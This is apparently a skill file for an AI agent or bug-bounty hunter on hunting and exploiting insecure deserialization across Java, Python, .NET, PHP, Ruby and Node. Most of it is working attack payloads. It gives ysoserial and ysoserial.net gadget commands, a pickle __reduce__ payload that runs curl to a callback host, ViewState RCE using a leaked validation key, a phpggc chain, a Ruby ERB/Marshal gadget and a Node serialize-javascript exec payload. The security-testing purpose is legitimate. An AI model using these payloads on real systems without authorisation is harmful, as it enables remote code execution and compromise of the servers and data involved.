---
name: hunt-deserialization
description: Java/Python/.NET/PHP/Ruby/Node deserialization — magic methods, gadget chains, ysoserial families.
keywords: [deserialization, serialization, gadget, ysoserial, pickle, marshal, java serialized, dotnet binaryformatter, php phar, ruby marshal, node serialize]
---

# hunt-deserialization

## Triggers

"deserialization", "ysoserial", "pickle rce", "magic method", "phar",
"BinaryFormatter", "ObjectInputStream".

## Phase 1 — find serialized blob

Hex / base64-looking blobs in:
- Cookies (`oauth_state`, `viewstate`, `session`)
- Hidden form fields
- HTTP headers (`X-Auth-Token`, custom)
- File uploads (`.ser`, `.dat`, `.bin`)
- Cache files
- IPC sockets (Redis, RabbitMQ payloads)

Magic prefixes:

| Bytes | Format |
|---|---|
| `aced 0005` | Java `ObjectOutputStream` |
| `1f8b 08` | Gzip — unwrap then re-inspect |
| `78 9c` | zlib — same |
| `4F626a01` (`O` `b` `j` 0x01) | Apache Avro / .NET BinaryFormatter |
| `80 02` / `80 03` / `80 04` / `80 05` | Python pickle protocol 2-5 |
| `04 08` | Ruby Marshal |
| `O:` `s:` `a:` (PHP serialize) | PHP — readable |
| `__cfduid`, `eyJ` | JWT (not deserialization, see `hunt-jwt`) |

## Phase 2 — Java with ysoserial

```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://<collab>' \
  | base64 -w0
```

Common gadget families:

- `CommonsCollections1..7` — Apache Commons Collections classpath
- `CommonsBeanutils1` — Spring family
- `Spring1`, `Spring2`
- `Hibernate1`, `JSON1`
- `URLDNS` — DNS-only payload (great for probing without RCE)

Probe first with `URLDNS` (zero impact):

```bash
java -jar ysoserial.jar URLDNS 'http://<collab>' | base64 -w0
```

If your collab gets a DNS hit → deserialization confirmed. Then
escalate to a gadget that matches the target's classpath.

## Phase 3 — Python pickle

```python
import pickle, os, base64
class E:
    def __reduce__(self):
        return (os.system, ('curl http://<collab>',))
payload = base64.b64encode(pickle.dumps(E())).decode()
print(payload)
```

Pickle is **always** RCE if you control input — no gadget chain
needed.

## Phase 4 — .NET BinaryFormatter / SoapFormatter

```bash
ysoserial.net -f BinaryFormatter -g TextFormattingRunProperties \
  -c 'cmd /c ping <collab>'
```

Other formatters: `LosFormatter` (ASP.NET ViewState), `NetDataContractSerializer`,
`DataContractSerializer` (less exploitable).

ViewState specifically:

```bash
ysoserial.net -p ViewState -g TypeConfuseDelegate \
  --validationkey=<from-web.config> --validationalg=SHA1 \
  -c 'whoami > C:\Windows\Temp\poc.txt'
```

If `validationKey` is leaked, ViewState RCE on .NET Framework is a
single command.

## Phase 5 — PHP serialize / phar

PHP serialize is text:

```
O:6:"Logger":1:{s:7:"logfile";s:11:"/tmp/x.txt";}
```

Look for `__wakeup()`, `__destruct()`, `__toString()` magic methods
in the codebase. Pop-chain hunting uses tools like `phpggc`:

```bash
phpggc Symfony/RCE4 system 'id' -b
```

Phar deserialization: when `unserialize()` is unreachable but
`file_exists($_GET['x'])` is — `phar://` stream wrapper triggers
deserialization on metadata.

```
phar://uploads/poc.phar.png
```

## Phase 6 — Ruby Marshal

```ruby
require 'erb'
require 'base64'
erb = ERB.allocate
erb.instance_variable_set :@src, "`id`"
erb.instance_variable_set :@filename, "1"
erb.instance_variable_set :@lineno, 1
puts Base64.strict_encode64(Marshal.dump(erb.def_method(Object, "eval", "x")))
```

Rails `Marshal.load(cookie)` was the famous CVE-2013-0156 family.

## Phase 7 — Node.js `serialize-javascript`

The `serialize-javascript` library accepts arbitrary code via
function strings:

```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

Look for any code path that reads cookies/body into `eval`-like
deserialization.

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| CVE-2015-7501 (Commons Collections) | Defining Java deser bug |
| CVE-2017-9805 (Struts2 REST) | XML deserialization via XStream |
| CVE-2017-12149 (JBoss) | HTTP Invoker readObject |
| CVE-2018-2628 (WebLogic T3) | T3 protocol deser |
| CVE-2019-2725 (WebLogic) | XML deser via wls-wsat |
| CVE-2021-44521 (Cassandra) | Java UDF via Nashorn deser |
| CVE-2023-22518 (Confluence) | Improper auth + deser |
| CVE-2025-23006 (SonicWall SMA1000) | Pre-auth deser → RCE |
| H1 #105341 (PayPal) | Java deser via JSF view state |

## Never-submit fallbacks

- Found serialized blob in cookie without exploit chain → CHAIN REQUIRED
- DNS hit via URLDNS but no RCE gadget for target classpath →
  DOWNGRADE (info-only)
- Deserialization in a self-auth-only context → DOWNGRADE

## See also

- `hunt-rce` — endpoint of every deser chain
- `hunt-file-upload` — phar / serialized file vectors
- `triage-validation` — Q6 demands a working code-exec PoC, not URLDNS
